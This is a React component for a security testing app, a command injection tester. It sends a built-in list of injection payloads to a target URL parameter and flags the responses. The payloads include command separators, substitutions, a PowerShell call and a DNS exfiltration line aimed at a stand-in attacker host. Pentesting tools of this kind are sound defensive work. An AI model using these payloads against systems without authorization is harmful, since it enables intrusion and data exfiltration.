import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

export default function CommandInjectionTester() {
  const [targetUrl, setTargetUrl] = useState('');
  const [parameter, setParameter] = useState('filename');
  const [results, setResults] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const setActiveGalaxyTool = useStore((state) => state.setActiveGalaxyTool);

  const payloads = [
    { name: 'Basic Command Injection', payload: '; ls', description: 'Unix command separator' },
    { name: 'Command Substitution', payload: '`whoami`', description: 'Backtick execution' },
    { name: 'Command Substitution 2', payload: '$(whoami)', description: 'Dollar-paren execution' },
    { name: 'Pipe Operator', payload: '| whoami', description: 'Pipe to command' },
    { name: 'AND Operator', payload: '&& whoami', description: 'Execute if previous succeeds' },
    { name: 'OR Operator', payload: '|| whoami', description: 'Execute if previous fails' },
    { name: 'Background Execution', payload: '& whoami &', description: 'Run in background' },
    { name: 'Newline Injection', payload: '%0a whoami', description: 'URL-encoded newline' },
    { name: 'Null Byte', payload: '%00; whoami', description: 'Null byte separator' },
    { name: 'Windows Command', payload: '& dir', description: 'Windows directory listing' },
    { name: 'PowerShell', payload: '; powershell -c "Get-Process"', description: 'PowerShell command' },
    { name: 'Time-based (Linux)', payload: '; sleep 5', description: 'Delays for 5 seconds' },
    { name: 'Time-based (Windows)', payload: '& timeout 5', description: 'Windows timeout' },
    { name: 'Output Redirection', payload: '; ls > /tmp/output.txt', description: 'Redirect output' },
    { name: 'DNS Exfiltration', payload: '; nslookup $(whoami).attacker.com', description: 'DNS-based data exfiltration' },
  ];

  const testInjection = async () => {
    if (!targetUrl || !parameter) {
      alert('Please provide target URL and parameter name');
      return;
    }

    setLoading(true);
    setResults([]);
    const testResults: any[] = [];

    for (const payload of payloads) {
      try {
        const url = new URL(targetUrl);
        url.searchParams.set(parameter, payload.payload);

        const startTime = Date.now();
        
        // Make actual HTTP request
        const response: any = await window.electronAPI.net.httpFetch(url.toString(), { 
          method: 'GET',
          timeout: 10000 
        });
        
        const responseTime = Date.now() - startTime;

        const testResult = {
          name: payload.name,
          payload: payload.payload,
          description: payload.description,
          url: url.toString(),
          responseTime,
          vulnerable: false,
          indicators: [] as string[],
        };

        if (!response.success) {
          testResult.indicators.push(`✗ Request failed: ${response.error}`);
          testResults.push(testResult);
          setResults([...testResults]);
          continue;
        }

        // Detection logic based on actual response
        if (payload.payload.includes('sleep') || payload.payload.includes('timeout')) {
          if (responseTime > 4000) {
            testResult.vulnerable = true;
            testResult.indicators.push(`⚠️ Time-based: Response took ${responseTime}ms (expected ~5000ms)`);
          }
        }

        // Check response for command output indicators
        const responseData = response.data.toLowerCase();
        const commandIndicators = ['root:', 'uid=', 'gid=', 'volume in drive', 'directory of', 'bin/bash'];
        
        for (const indicator of commandIndicators) {
          if (responseData.includes(indicator)) {
            testResult.vulnerable = true;
            testResult.indicators.push(`⚠️ Command output detected: "${indicator}"`);
          }
        }

        if (testResult.indicators.length === 0) {
          testResult.indicators.push('ℹ️ No obvious command execution detected');
        }

        testResults.push(testResult);
        setResults([...testResults]);
        
      } catch (error: any) {
        testResults.push({
          name: payload.name,
          payload: payload.payload,
          description: payload.description,
          error: error.message,
          vulnerable: false,
        });
        setResults([...testResults]);
      }
    }

    setLoading(false);
  };

  const exportResults = () => {
    const report = {
      target: targetUrl,
      parameter,
      timestamp: new Date().toISOString(),
      payloads: results,
      summary: {
        total: results.length,
        vulnerable: results.filter(r => r.vulnerable).length,
        suspicious: results.filter(r => r.indicators?.length > 0).length,
      },
    };

    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cmd-injection-test-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.header}>
        <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path d="M19 12H5M12 19l-7-7 7-7" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
        <div>
          <h2 className={styles.title}>💉 Command Injection Tester</h2>
          <p className={styles.description}>Test for OS command injection vulnerabilities</p>
        </div>
      </div>

      <div className={styles.content}>
        <div className={styles.warning}>
          ⚠️ <strong>Legal Warning:</strong> Only test systems you have explicit permission to test. 
          Unauthorized testing is illegal.
        </div>

        <div className={styles.section}>
          <label className={styles.label}>Target URL</label>
          <input
            className={styles.input}
            type="text"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="https://example.com/api/download"
          />
        </div>

        <div className={styles.section}>
          <label className={styles.label}>Parameter Name</label>
          <input
            className={styles.input}
            type="text"
            value={parameter}
            onChange={(e) => setParameter(e.target.value)}
            placeholder="filename"
          />
        </div>

        <div className={styles.buttonGroup}>
          <button 
            className={styles.button} 
            onClick={testInjection}
            disabled={loading}
          >
            {loading ? `Testing (${results.length}/${payloads.length})...` : 'Run Tests'}
          </button>
          {results.length > 0 && (
            <button className={styles.buttonSecondary} onClick={exportResults}>
              Export Results
            </button>
          )}
        </div>

        {results.length > 0 && (
          <div className={styles.section}>
            <h3 className={styles.subtitle}>Test Results ({results.length}/{payloads.length})</h3>
            <div className={styles.resultList}>
              {results.map((result, idx) => (
                <div 
                  key={idx} 
                  className={`${styles.resultItem} ${result.vulnerable ? styles.vulnerable : ''}`}
                >
                  <div className={styles.resultHeader}>
                    <strong>{result.name}</strong>
                    {result.vulnerable && <span className={styles.badge}>VULNERABLE</span>}
                  </div>
                  <div className={styles.info}>
                    <strong>Payload:</strong> <code>{result.payload}</code>
                  </div>
                  <div className={styles.info}>
                    <strong>Description:</strong> {result.description}
                  </div>
                  {result.responseTime && (
                    <div className={styles.info}>
                      <strong>Response Time:</strong> {result.responseTime}ms
                    </div>
                  )}
                  {result.indicators && result.indicators.length > 0 && (
                    <div className={styles.indicators}>
                      {result.indicators.map((ind: string, i: number) => (
                        <div key={i} className={styles.indicator}>{ind}</div>
                      ))}
                    </div>
                  )}
                  {result.error && (
                    <div className={styles.error}>Error: {result.error}</div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        <div className={styles.section}>
          <h3 className={styles.subtitle}>About Command Injection</h3>
          <div className={styles.info}>
            <p>Command injection occurs when user input is passed to system commands without proper sanitization.</p>
            <h4 style={{ marginTop: '1rem' }}>Common Vulnerable Functions:</h4>
            <ul>
              <li>PHP: exec(), system(), passthru(), shell_exec()</li>
              <li>Python: os.system(), subprocess.call()</li>
              <li>Node.js: child_process.exec()</li>
              <li>Java: Runtime.getRuntime().exec()</li>
            </ul>
            <h4 style={{ marginTop: '1rem' }}>Prevention:</h4>
            <ul>
              <li>Use parameterized APIs instead of shell commands</li>
              <li>Validate and whitelist input</li>
              <li>Escape special characters</li>
              <li>Use least privilege for application processes</li>
              <li>Implement WAF rules to detect injection attempts</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
